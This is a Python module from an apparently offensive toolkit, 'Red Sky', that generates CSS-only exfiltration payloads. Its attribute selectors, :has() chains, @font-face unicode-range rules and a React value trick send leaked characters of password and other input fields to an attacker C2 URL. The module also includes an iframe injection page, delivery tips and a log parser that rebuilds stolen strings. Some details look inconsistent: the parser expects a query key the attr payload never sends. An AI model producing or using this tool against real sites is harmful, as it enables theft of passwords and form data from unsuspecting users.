# language: Python, file: Program/browser/cssexfil.py, target: Red Sky browser — CSS exfiltration
# Generates HTML/CSS payloads that leak page data to an attacker-controlled
# endpoint via the browser's own resource loading, with zero JS execution. The
# leaker is triggered by:
#   - attribute selectors  (input[value^="a"] + background: url(...))
#   - :has() chain         (modern Chrome/Safari — attribute matching without JS)
#   - @font-face           (unicode-range + font URL per character)
#   - input value probing  (matches React controlled inputs, still works in 2026)
# Subcommands:
#   attr      -- attribute-prefix selector payload
#   has       -- :has() based payload (no attribute selectors needed)
#   font      -- @font-face + unicode-range char-by-char leak
#   react     -- value-based leak tuned for React controlled inputs
#   page      -- full HTML wrapper that fires on load
# Each generator takes a --target-selector (e.g. 'input[type=password]') and
# a --c2 endpoint. The attacker parses the URL query strings on the C2 side to
# recover leaked characters in order.

import argparse
import json
import sys
import time
import urllib.parse
from pathlib import Path
from typing import Dict, List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


BROWSER_DIR = OUTPUT_DIR / "browser"
CSS_DIR = BROWSER_DIR / "cssexfil"
CSS_DIR.mkdir(parents=True, exist_ok=True)


# ── charset used for the leak alphabet ──
LOWER = "abcdefghijklmnopqrstuvwxyz"
UPPER = LOWER.upper()
DIGITS = "0123456789"
PUNCT = "!@#$%^&*()_+-=[]{}|;:',.<>/?"


def _chunks(s: str, n: int) -> List[str]:
    return [s[i:i+n] for i in range(0, len(s), n)]


# ── 1. attribute-prefix selector payload ──
ATTR_TEMPLATE = '''/* Red Sky CSS exfil — attribute prefix match */
/* Fires a background-image request for each matching prefix. */
{selectors}
'''

ATTR_SELECTOR = (
    '{sel}[value^="{prefix}"] {{ '
    'background-image: url("{c2}?leak={prefix}&t={tag}"); '
    '}}'
)


def cmd_attr(selector: str, c2: str, tag: str, alphabet: str,
             depth: int, out_file: str) -> int:
    if not selector or not c2:
        print_err("--selector and --c2 required")
        return 2
    if not tag:
        tag = "f" + str(int(time.time()))

    # depth = number of characters to leak. For each position, we need a
    # separate selector chain. The classic technique builds one CSS rule per
    # (prefix, next-char) pair up to depth N. That's exponential in depth
    # without a value-change trick, so we do it in two stages:
    #   stage A: leak the FIRST character via single-char prefix matches
    #   stage B: after leaking, the attacker can re-serve CSS with the known
    #            prefix fixed to leak the SECOND char, and so on (interactive).
    rules = []
    rules.append("/* Stage A: leak first character of " + selector + " */")
    for ch in alphabet:
        rules.append(ATTR_SELECTOR.format(sel=selector, prefix=ch, c2=c2, tag=tag))
    # hidden preloads for the second-character stage — the attacker
    # iteratively re-serves this file with `known + <char>` prefixes.
    rules.append("")
    rules.append("/* Stage B (interactive): re-serve this file with prefixes fixed */")
    rules.append("/* example for known='p': " + ATTR_SELECTOR.format(sel=selector, prefix="p", c2=c2, tag=tag) + " */")

    content = ATTR_TEMPLATE.format(selectors="\n".join(rules))

    out = Path(out_file) if out_file else CSS_DIR / ("attr_" + tag + ".css")
    out.write_text(content)
    print_ok("wrote " + str(out))
    print_kv("selector", selector)
    print_kv("c2", c2)
    print_kv("tag", tag)
    print_kv("alphabet", str(len(alphabet)) + " chars")
    print_kv("rules", str(len(rules)))
    print()
    print_info("serve this CSS from a URL referenced by a <link> in the victim page")
    print_info("each :contains-like match fires a background-image GET to the C2")
    print_info("interactive mode: parse the tag prefix in the C2 log, re-serve with longer prefix")
    return 0


# ── 2. :has() based payload (no attribute selectors on inputs directly) ──
HAS_SELECTOR = (
    'html:has({sel}[value^="{prefix}"]) body {{ '
    'background-image: url("{c2}?has={prefix}&t={tag}"); '
    '}}'
)


def cmd_has(selector: str, c2: str, tag: str, alphabet: str, out_file: str) -> int:
    if not selector or not c2:
        print_err("--selector and --c2 required")
        return 2
    tag = tag or ("h" + str(int(time.time())))

    rules = ["/* Red Sky CSS exfil — :has() chain */"]
    for ch in alphabet:
        rules.append(HAS_SELECTOR.format(sel=selector, prefix=ch, c2=c2, tag=tag))

    content = "\n".join(rules)
    out = Path(out_file) if out_file else CSS_DIR / ("has_" + tag + ".css")
    out.write_text(content)

    print_ok("wrote " + str(out))
    print_kv("selector", selector)
    print_kv("c2", c2)
    print_kv("rules", str(len(rules) - 1))
    print()
    print_info("works on Chrome 105+, Safari 15.4+, Edge 105+; Firefox 121+ has partial support")
    return 0


# ── 3. font-face + unicode-range ──
FONT_TEMPLATE = (
    '@font-face {{ '
    'font-family: leak{n}; '
    'src: url("{c2}?f={n}&t={tag}"); '
    'unicode-range: U+{cp}; '
    '}} '
    '.probe {{ font-family: leak{n}; }}'
)


def cmd_font(c2: str, tag: str, alphabet: str, out_file: str) -> int:
    if not c2:
        print_err("--c2 required")
        return 2
    tag = tag or ("u" + str(int(time.time())))

    blocks = ["/* Red Sky CSS exfil — unicode-range leak */"]
    blocks.append("/* target text sits in an element with class .probe */")
    # one @font-face per character we want to detect
    for i, ch in enumerate(alphabet):
        cp = "%04X" % ord(ch)
        blocks.append(FONT_TEMPLATE.format(n=i, cp=cp, c2=c2, tag=tag))
    blocks.append(".probe { font-family: " + ", ".join("leak%d" % i for i in range(len(alphabet))) + "; }")

    content = "\n".join(blocks)
    out = Path(out_file) if out_file else CSS_DIR / ("font_" + tag + ".css")
    out.write_text(content)

    print_ok("wrote " + str(out))
    print_kv("alphabet", str(len(alphabet)) + " glyphs")
    print_kv("c2", c2)
    print()
    print_info("the target element must have class='probe' for the font to be applied")
    print_info("each font fires only if the corresponding glyph is on the page")
    return 0


# ── 4. React controlled-input value trick ──
REACT_SELECTOR = (
    '{sel}[value="{char}"]::placeholder {{ '
    'background-image: url("{c2}?react={char}&t={tag}"); '
    '}}'
)


def cmd_react(selector: str, c2: str, tag: str, alphabet: str, out_file: str) -> int:
    """React sets the `value` attribute at first render. Subsequent user typing
    updates only the DOM property, not the attribute. So we can leak whatever
    React put there originally — autofill, prefilled defaults, etc."""
    if not selector or not c2:
        print_err("--selector and --c2 required")
        return 2
    tag = tag or ("r" + str(int(time.time())))

    rules = ["/* Red Sky CSS exfil — React value trick */"]
    for ch in alphabet:
        ch_esc = ch.replace('"', '\\"')
        rules.append(REACT_SELECTOR.format(sel=selector, char=ch_esc, c2=c2, tag=tag))

    content = "\n".join(rules)
    out = Path(out_file) if out_file else CSS_DIR / ("react_" + tag + ".css")
    out.write_text(content)

    print_ok("wrote " + str(out))
    print_kv("selector", selector)
    print_kv("c2", c2)
    print()
    print_info("::placeholder triggers even when the value is only set on the attribute")
    print_info("combined with :has() this leaks the first char of every prefilled field")
    return 0


# ── 5. full HTML wrapper ──
PAGE_TEMPLATE = '''<!doctype html>
<html><head><meta charset="utf-8"><title>Loading</title>
<link rel="stylesheet" href="{css_url}">
</head><body>
<!-- Minimal injection page. In the real attack this is stuffed into a
     comment field, a chat message, or a shared document that the target
     views while logged in to the target app. -->
<iframe src="{target_url}" style="width:800px;height:600px;border:0" sandbox="allow-same-origin allow-forms allow-scripts"></iframe>
<p>If the content does not load, please refresh.</p>
</body></html>
'''


def cmd_page(target_url: str, css_url: str, out_file: str) -> int:
    if not target_url or not css_url:
        print_err("--target-url and --css-url required")
        return 2
    html = PAGE_TEMPLATE.format(target_url=target_url, css_url=css_url)
    out = Path(out_file) if out_file else CSS_DIR / ("page_" + str(int(time.time())) + ".html")
    out.write_text(html)
    print_ok("wrote " + str(out))
    print_kv("target", target_url)
    print_kv("css", css_url)
    print()
    print_info("host this HTML on your C2 alongside the CSS; deliver the URL")
    return 0


# ── analysis helper: parse C2 hits ──
def cmd_parse(hits_file: str, tag: str, out_file: str) -> int:
    """Given an access log of C2 hits, reconstruct the leaked string for a tag."""
    p = Path(hits_file).expanduser()
    if not p.exists():
        print_err("hits file not found: " + str(p))
        return 1

    # expects lines with ?attr=X&t=tag or ?has=X&t=tag or ?font=N&t=tag
    prefix_chars: List[str] = []
    font_positions: Dict[int, int] = {}
    for line in p.read_text().splitlines():
        if tag and tag not in line:
            continue
        try:
            q = urllib.parse.urlparse(line).query
            params = urllib.parse.parse_qs(q)
        except Exception:
            continue
        for k in ("attr", "has", "react"):
            if k in params:
                prefix_chars.append(params[k][0])
        if "f" in params:
            idx = int(params["f"][0])
            font_positions[idx] = font_positions.get(idx, 0) + 1

    print_info("CSS exfil parse")
    print_kv("tag", tag)
    print_kv("prefix hits", str(len(prefix_chars)))
    print_kv("font hits", str(len(font_positions)))

    reconstruction = {}
    if prefix_chars:
        print()
        print_info("prefix hit order (attacker reconstructs the string)")
        for c in prefix_chars:
            print("  " + SCARLET + c + RESET)
        reconstruction["prefix_hits"] = prefix_chars
    if font_positions:
        print()
        print_info("font positions seen")
        for idx in sorted(font_positions):
            print("  " + ARTERY + "font " + str(idx) + RESET + "  hits=" + str(font_positions[idx]))
        reconstruction["font_hits"] = font_positions

    out = Path(out_file) if out_file else CSS_DIR / ("parse_" + (tag or "all") + ".json")
    out.write_text(json.dumps(reconstruction, indent=2))
    print()
    print_kv("saved", out)
    return 0


def run_cli(args):
    p = argparse.ArgumentParser(prog="redsky browser cssexfil", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="help",
                   choices=["attr", "has", "font", "react", "page", "parse", "help"])
    p.add_argument("--selector", default="input[type=password]")
    p.add_argument("--c2", default="")
    p.add_argument("--tag", default="")
    p.add_argument("--alphabet", default=LOWER + DIGITS)
    p.add_argument("--depth", type=int, default=1)
    p.add_argument("--css-url", default="")
    p.add_argument("--target-url", default="")
    p.add_argument("--hits", default="", help="access-log file for parse")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky browser cssexfil <attr|has|font|react|page|parse> [opts]")
        return 2

    if ns.action == "help" or ns.help:
        print_info("attr  --selector 'input[type=password]' --c2 https://x/leak")
        print_info("has   --selector 'form#login input' --c2 https://x/leak")
        print_info("font  --c2 https://x/leak")
        print_info("react --selector 'input#email' --c2 https://x/leak")
        print_info("page  --target-url https://app.example/ --css-url https://x/leak.css")
        print_info("parse --hits access.log --tag f12345")
        return 0

    if ns.action == "attr":
        return cmd_attr(ns.selector, ns.c2, ns.tag, ns.alphabet, ns.depth, ns.out)
    if ns.action == "has":
        return cmd_has(ns.selector, ns.c2, ns.tag, ns.alphabet, ns.out)
    if ns.action == "font":
        return cmd_font(ns.c2, ns.tag, ns.alphabet, ns.out)
    if ns.action == "react":
        return cmd_react(ns.selector, ns.c2, ns.tag, ns.alphabet, ns.out)
    if ns.action == "page":
        return cmd_page(ns.target_url, ns.css_url, ns.out)
    if ns.action == "parse":
        return cmd_parse(ns.hits, ns.tag, ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
